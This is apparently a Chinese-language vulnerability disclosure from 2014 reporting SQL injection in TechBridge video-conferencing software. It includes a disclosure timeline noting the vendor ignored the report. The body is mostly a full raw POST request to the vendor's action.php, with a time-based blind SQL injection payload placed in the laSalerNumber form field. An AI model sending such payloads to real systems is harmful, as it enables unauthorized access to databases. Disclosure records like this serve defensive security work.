漏洞详情 披露状态：   									2014-07-08：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-08-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 唐桥视频会议存在注入 详细说明：  POST注入：http://www.techbridge-inc.com/action.phpPOST /action.php HTTP/1.1Content-Length: 500Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.techbridge-inc.com/Host: www.techbridge-inc.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*laAddress=3137%20Laguna%20Street&laBusiness=1&laCompanyName=mkqvenni&laCustomerDescribe=1&laEmail=sample%40email.tst&laFax=317-317-3137&laLegalMan=1&laLinkMan=1&laLinkPhone=555-666-0606&laMonth=7&laRegisterCapital=1&laSaleAbout=1&laSalerNumber=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/&laTechnicianNumber=1&laTrade=1&laWebSite=http://www.acunetix.com&laYear=1967&module=leagueApply&Submit=%e7%94%b3%e8%af%b7
